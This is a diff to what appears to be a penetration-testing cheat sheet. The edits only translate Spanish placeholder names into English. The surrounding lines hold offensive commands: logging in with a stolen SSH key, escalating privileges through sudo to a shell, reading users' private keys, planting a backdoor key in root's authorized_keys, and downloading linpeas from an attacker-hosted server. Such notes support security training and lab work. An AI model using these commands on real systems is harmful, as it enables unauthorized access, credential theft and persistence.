@@ -15,7 +15,7 @@ sidebar:
 ### SSH
 
 ```bash
-ssh usuario@10.10.10.10
+ssh user@10.10.10.10
 ssh root@10.10.10.10 -i id_rsa   # stolen private key (chmod 600 id_rsa first)
 ```
 
@@ -149,7 +149,7 @@ ftp -p <IP>
 
 ```bash
 smbclient -N -L \\\\<IP>                  # list shares without auth
-smbclient -U usuario \\\\<IP>\\share     # connect with credentials
+smbclient -U user \\\\<IP>\\share     # connect with credentials
 > ls / cd folder / get file.txt
 nmap --script smb-os-discovery.nse -p445 <IP>
 ```
@@ -284,7 +284,7 @@ stty rows 67 columns 318
 ```bash
 sudo -l                         # see what the current user can run
 sudo su -                       # if they have ALL → root
-sudo -u otrouser /bin/echo test # run as another user
+sudo -u otheruser /bin/echo test # run as another user
 ```
 
 > GTFOBins: look up the binary with `sudo` to see how to escalate → `sudo find . -exec /bin/sh \; -quit`
@@ -317,7 +317,7 @@ grep -r "password" /var/www/ 2>/dev/null
 ### SSH Keys
 
 ```bash
-cat /home/usuario/.ssh/id_rsa    # copy → chmod 600 id_rsa → ssh -i id_rsa
+cat /home/user/.ssh/id_rsa    # copy → chmod 600 id_rsa → ssh -i id_rsa
 # Backdoor: add your public key to the compromised host
 echo "ssh-rsa AAAA...your_key" >> /root/.ssh/authorized_keys
 ssh-keygen -f key                # generate pair to implant
@@ -344,7 +344,7 @@ wget http://10.10.14.1:8000/linpeas.sh
 curl http://10.10.14.1:8000/linpeas.sh -o linpeas.sh
 
 # SCP (if SSH credentials are available)
-scp linpeas.sh usuario@10.10.10.10:/tmp/linpeas.sh
+scp linpeas.sh user@10.10.10.10:/tmp/linpeas.sh
 
 # Base64 (if there is no network outbound access)
 base64 shell -w 0                          # on attacker → copy string
@@ -361,7 +361,7 @@ file shell                                 # verify file type
 
 ```
 Projects/
-└── Cliente/
+└── Client/
     └── EPT/
         ├── evidence/
         │   ├── credentials/
